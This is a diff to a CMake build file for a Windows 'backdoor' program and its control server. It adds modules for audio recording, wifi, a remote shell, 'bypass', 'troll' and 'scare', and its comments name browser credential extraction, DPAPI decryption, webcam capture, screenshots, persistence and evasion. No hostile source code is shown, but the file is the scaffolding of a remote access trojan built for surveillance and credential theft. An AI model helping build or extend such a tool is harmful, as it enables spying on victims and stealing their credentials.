@@ -24,6 +24,13 @@ add_executable(backdoor
     src/crypto.c
     src/persistence.c
     src/evasion.c
+    src/audio.c
+    src/wifi.c
+    src/shell.c
+    src/bypass.c
+    src/troll.c
+    src/scare.c
+
     # Uncomment and add sqlite3.c when using browser credential extraction:
     # src/sqlite3.c
 )
@@ -34,13 +41,16 @@ add_executable(server
     src/server.c
     src/status.c
     src/str_cut.c
+    src/crypto.c
 )
+
 
 # Backdoor libraries (Windows only)
 if(WIN32)
 target_link_libraries(backdoor
     ws2_32      # WinSock2 networking
     gdi32       # Graphics (screenshots)
+    winmm       # Multimedia (audio recording)
     bcrypt      # Cryptography (AES, ECDH, SHA-256)
     crypt32     # DPAPI (browser credential decryption)
     strmiids    # DirectShow GUIDs (webcam)
@@ -57,7 +67,9 @@ endif()
 if(WIN32)
     target_link_libraries(server
         ws2_32      # WinSock2 networking
+        bcrypt      # Cryptography
     )
+
 else()
     find_package(Threads REQUIRED)
     target_link_libraries(server
